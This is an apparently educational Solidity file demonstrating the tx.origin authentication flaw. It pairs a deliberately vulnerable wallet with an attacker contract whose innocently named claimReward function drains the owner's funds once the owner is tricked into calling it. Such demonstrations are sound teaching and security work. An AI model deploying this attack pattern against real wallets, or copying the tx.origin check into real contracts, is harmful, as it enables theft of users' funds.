// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/// @title VulnerableWallet
/// @notice DO NOT USE IN PRODUCTION
/// @dev Demonstrates tx.origin authentication vulnerability
/// Full guide: coming soon on blockhertz.com/blog

contract VulnerableWallet {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    // ❌ VULNERABLE: tx.origin phishing attack possible
    // Attacker deploys malicious contract
    // Tricks owner into calling malicious contract
    // Malicious contract calls this withdraw()
    // tx.origin = owner (original sender)
    // Authentication passes — funds drained
    function withdraw(address payable to, uint256 amount) external {
        require(tx.origin == owner, "Not owner");
        to.transfer(amount);
    }

    function deposit() external payable {}
}

// Attack contract — deployed by attacker
contract AttackWallet {
    VulnerableWallet public target;
    address payable public attacker;

    constructor(address _target) {
        target = VulnerableWallet(_target);
        attacker = payable(msg.sender);
    }

    // Owner calls this thinking it does something else
    // But it drains their wallet via tx.origin exploit
    function claimReward() external {
        target.withdraw(attacker, address(target).balance);
    }
}
